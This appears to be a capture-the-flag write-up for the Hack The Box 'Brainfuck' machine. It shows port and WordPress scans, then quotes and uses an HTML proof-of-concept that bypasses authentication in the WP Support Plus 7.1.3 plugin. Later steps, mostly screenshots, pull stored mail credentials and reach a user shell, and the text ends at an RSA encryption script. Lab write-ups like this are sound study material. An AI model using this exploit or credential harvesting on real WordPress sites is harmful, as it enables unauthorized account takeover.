## Enumeration

Port Scan
```bash
nmap -sC -sV -A -T4 10.10.10.17 -oN Nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 02:32 EDT
Nmap scan report for 10.10.10.17
Host is up (0.15s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA USER TOP UIDL AUTH-RESP-CODE RESP-CODES SASL(PLAIN)
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: capabilities OK AUTH=PLAINA0001 ENABLE more listed have post-login SASL-IR IMAP4rev1 ID Pre-login LITERAL+ LOGIN-REFERRALS IDLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   154.05 ms 10.10.14.1
2   154.78 ms 10.10.10.17

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.77 seconds
```
### Port 443


### checking the certificate:
![[Pasted image 20211009121732.png]]

Add new dns name in /etc/hosts file

Visit https://sup3rs3cr3t.brainfuck.htb/
![[Pasted image 20211009122309.png]]

Visit www.brainfuck,htb
![[Pasted image 20211009122538.png]]

Since we have the wordpress site lets enumerate using the wpscan

```wpscan --url https://brainfuck.htb --disable-tls-checks
```

we got the wordpress version.
```
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
```

An outdated wordpress Plugin
```
[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

```

Lets search for any exploits 
```
searchsploit WP Support Plus Responsive Ticket System
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabil | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalat | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection     | php/webapps/40939.txt
------------------------------------------------------------------------------------ ---------------------------------
```
Let’s look at the privilege escalation vulnerability.

```searchsploit -x 41006.txt```
```
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
# Date: 10-01-2017
# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: web
 
1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>

Then you can go to admin panel.
/usr/share/exploitdb/exploits/php/webapps/41006.txt (END)
```
According to the [documentation](https://www.exploit-db.com/exploits/41006), this vulnerability allows you to bypass authentication by logging in as anyone without knowing the password. You do however need a valid username for the attack to work. Therefore, let’s use wpscan to enumerate usernames.

wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u

```
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

###  Gaining an Initial Foothold

Copy the POC code from the [vulnerability entry on searchsploit](https://www.exploit-db.com/exploits/41006) and save it in the file privesc.html. Change the URL to the name of the machine.

Run it in the browser and login as administrator.
![[Pasted image 20211010082530.png]]

Refresh the brainfuck.htb page and we’re logged in as administrator!
![[Pasted image 20211010082755.png]]

There doesn’t seem to be much functionality available for this user. Therefore, let’s try the ‘admin’ user next. Perform the same exploit again except with the username being ‘admin’.
![[Pasted image 20211010083138.png]]

Go to themes from the dashboard
![[Pasted image 20211010083328.png]]


Smtp passwd
![[Pasted image 20211010083552.png]]

Get the password by looking into the inspect element
![[Pasted image 20211010083650.png]]

![[Pasted image 20211010085022.png]]

![[Pasted image 20211010085053.png]]

![[Pasted image 20211010085125.png]]

orisiteis mail box
![[Pasted image 20211010085604.png]]
we get another credentials
![[Pasted image 20211010085706.png]]

![[Pasted image 20211010085920.png]]

![[Pasted image 20211010085954.png]]


![[Pasted image 20211010092548.png]]

Key page which is encrypted
![[Pasted image 20211010092507.png]]


Decrytping
![[Pasted image 20211010095413.png]]
![[Pasted image 20211010095329.png]]


we get the encrypted idrsa
![[Pasted image 20211010095730.png]]



user:
![[Pasted image 20211010101453.png]]

```
orestis@brainfuck:~$ ls -la
total 60
drwxr-xr-x 7 orestis orestis 4096 Apr 29  2017 .
drwxr-xr-x 3 root    root    4096 Apr 13  2017 ..
-rw------- 1 root    root       1 Dec 24  2017 .bash_history
-rw-r--r-- 1 orestis orestis  220 Apr 13  2017 .bash_logout
-rw-r--r-- 1 orestis orestis 3771 Apr 13  2017 .bashrc
drwx------ 2 orestis orestis 4096 Apr 29  2017 .cache
drwxr-xr-x 3 root    root    4096 Apr 17  2017 .composer
-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
-rw-r--r-- 1 orestis orestis  655 Apr 13  2017 .profile
drwx------ 8 orestis orestis 4096 Apr 29  2017 .sage
drwx------ 2 orestis orestis 4096 Apr 17  2017 .ssh
-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
```

```bash
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```
